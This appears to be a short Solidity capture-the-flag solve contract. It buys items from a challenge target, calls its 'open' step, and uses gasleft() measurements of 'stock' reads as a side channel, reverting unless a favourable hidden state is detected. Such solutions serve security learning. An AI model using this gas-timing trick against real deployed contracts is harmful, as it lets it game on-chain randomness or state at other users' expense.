pragma solidity 0.8.35;

interface Setup {
    function TARGET() external view returns (address);
}

interface Target {
    function buy(uint256) external payable;
    function open() external;
    function stock(uint256) external view returns (uint256);
}

contract Solve {
    Target immutable TARGET;

    constructor(address setup) payable {
        TARGET = Target(Setup(setup).TARGET());
        TARGET.buy{value: 10 ether}(10);
    }

    function step() external {
        TARGET.open();
    }

    function gamble() external view {
        uint256 g = gasleft();
        TARGET.stock(0);
        uint256 a = g - gasleft();
        g = gasleft();
        TARGET.stock(1);
        uint256 b = g - gasleft();
        g = gasleft();
        TARGET.stock(2);
        uint256 c = g - gasleft();
        g = gasleft();
        TARGET.stock(3);
        uint256 d = g - gasleft();
        if (d > a || d > b || d > c) revert();
    }
}
